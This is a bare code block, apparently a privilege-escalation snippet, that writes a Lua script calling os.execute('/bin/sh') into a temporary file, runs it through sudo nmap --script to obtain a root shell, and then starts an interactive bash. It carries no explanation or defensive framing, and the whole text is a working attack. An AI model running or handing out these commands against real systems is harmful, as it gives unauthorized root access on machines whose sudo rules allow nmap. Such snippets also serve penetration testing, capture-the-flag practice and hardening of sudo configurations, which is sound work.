```
TF=$(mktemp) 

echo 'os.execute("/bin/sh")' > $TF 

sudo nmap --script=$TF 

/bin/bash -i
```